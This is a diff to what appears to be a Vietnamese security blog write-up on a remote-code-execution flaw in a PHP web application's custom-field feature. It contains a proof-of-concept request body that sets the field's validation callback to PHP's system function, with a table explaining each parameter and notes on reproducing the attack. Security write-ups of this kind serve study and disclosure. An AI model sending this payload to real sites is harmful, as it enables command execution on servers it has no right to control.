@@ -188,6 +188,13 @@ Connection: keep-alive
 save=1&fid=0&system=0&title=PoC+RCE&description=PoC&required=0&show_register=1&user_editable=1&show_profile=1&class=&field_type=textbox&field=nv_poc_rce&match_type=callback&match_callback=system&min_length=0&max_length=100&default_value=
 ```
 
+![](/blog/assets/add.png)
+
+![](/blog/assets/checking.png)
+
+
+
+
 
 
 | Tham số          | Giá trị      | Vì sao                                                                                                                                                                     |
@@ -199,7 +206,7 @@ save=1&fid=0&system=0&title=PoC+RCE&description=PoC&required=0&show_register=1&u
 | `match_callback` | `system`     | Tên hàm PHP được lưu vào `func_callback`. Đây là hàm có khả năng thực thi lệnh hệ thống khi được gọi thông qua cơ chế callback.                                            |
 
 
-Response mong đợi: `302 Found` redirect về trang danh sách field (`fields.php`) — nghĩa là INSERT thành công.
+Response mong đợi: `301 Moved Permanently` redirect về trang danh sách field (`fields.php`) — nghĩa là INSERT thành công.
 
 **Lưu ý quan trọng khi tái tạo:** nếu bấm "Sửa" một field có sẵn thay vì "Thêm trường mới" (`fid` khác 0), server sẽ **ghi đè** `field_type` từ DB (`fields.php`):
 
